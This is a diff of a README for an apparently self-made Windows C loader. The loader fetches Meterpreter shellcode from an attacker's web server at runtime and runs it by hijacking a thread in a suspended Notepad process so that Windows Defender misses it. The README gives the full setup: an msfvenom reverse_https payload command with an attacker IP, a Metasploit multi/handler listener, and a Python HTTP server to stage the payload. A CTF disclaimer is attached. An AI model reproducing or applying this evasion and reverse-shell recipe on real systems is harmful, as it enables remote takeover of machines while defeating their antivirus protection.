@@ -1,19 +1,19 @@
 # 🎯 Meterpreter Payload exectuion
 
-A lightweight Windows C application developed using **Visual Studio**. The purpose of this project is to have a Meterpreter payload execute with Defender on. This approach will bypass defender but some of the functionalilties in a Meterpreter payload will still be flagged. The purpose of this was to use this on harder Hack The Box machines that may have defender enabled. This spolution is a output of MALDEV Academy, it has been a great course and helped me build this up to this point. 
+A lightweight Windows C application developed using **Visual Studio**. This project aims to execute a Meterpreter payload with Defender enabled. This approach helps bypass Defender, although some Meterpreter functionalities may still be flagged. This solution results from work done after following **MALDEV Academy** — a fantastic course that helped me reach this level.
 
 ---
 ⚠️ **Disclaimer:** This project is for educational purposes only. It is designed to help individuals understand how malware operates so they can better defend against it. Its intended purpose is for Hack the Box or CTF-like events. 
 
 ## Approach
 
-- Utilize a web stager to host the raw Meterpreter Binary. This fecthes the shell code at runtime and will avoid some common signtures by not storing the shell code on disk.
-- I then create a suspended process "Notepad.exe" and then hijack a thread of that process to execute the shell code
+- Utilize a web stager to host the raw Meterpreter Binary. This fetches the shell code at runtime and will avoid some common signatures by not storing the shell code on disk.
+- I then create a suspended process, "Notepad.exe" and then hijack a thread of that process to execute the shell code
 
 
 ## 🚀 Getting Started
 
-This is designed to be a web cradle. This exe will fetch your payload at run time then call back with a Meterpreter payload on a different port. Steps below are for setup
+This is designed to be a web cradle. This exe will fetch your payload at run time and then call back with a Meterpreter payload on a different port. The steps below are for setup.
 
 
 ### 🌱 Kali setup
@@ -21,14 +21,14 @@ This is designed to be a web cradle. This exe will fetch your payload at run tim
 1. Build the Payload 
 ``` bash
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.216.130 LPORT=8000 -f raw exitfunc=process --bad-chars '\x00' -o Meterpreter_Payload
-# Change the LHOST and PORT for you local machine that is hosting metasploit
+# Change the LHOST and PORT for your local machine that is hosting Metasploit
 ```
 
 2. Open Metasploit
 
 
  ```bash
-# in a different terminal setup metaploit below
+# In a different terminal setup Metasploit below
 msfconsole
 use multi/handler
 #set the lhost, lport, and payload to match the command above
@@ -36,7 +36,7 @@ use multi/handler
 3. Setup the python server
 
 ``` bash
-# in the same directory as the paylaod and a differnt terminal as Metasploit run the following commands
+# In the same directory as the payload and a different terminal as Metasploit, run the following commands
 python3 -m http.server 8080
 ``` 
 
@@ -51,7 +51,7 @@ python3 -m http.server 8080
 
 2. Open the `.sln` file in **Visual Studio**
 
-    - Change the IP and Port for you kali machine. Make sure the port used is the one hosting the python server.
+    - Change the IP and Port for your Kali machine. Make sure the port used hosts the Python server.
 
 3. Build the project:
     - Select **Build > Build Solution** (or press `Ctrl+Shift+B`)
@@ -64,5 +64,21 @@ python3 -m http.server 8080
 - Executing the payload on the target
 ![alt text](image-1.png)
 
-- A callback then a Meterpreter shell
+- A callback,, then a Meterpreter shell
 ![alt text](image-2.png)
+
+## 📚 Credits
+
+- **MALDEV Academy** — [maldevacademy.com](https://maldevacademy.com)  
+  A fantastic resource for learning malware development techniques.
+  
+- **Offensive Security Community** — [offensive-security.com](https://www.offensive-security.com)  
+  The community behind Kali Linux and other offensive security tools.
+
+- **Metasploit** — [metasploit.com](https://www.metasploit.com)  
+  A powerful framework for developing and executing exploit code against remote target machines.
+
+- **Python HTTP Server**  
+  Used to serve the payload during the attack.
+
+---
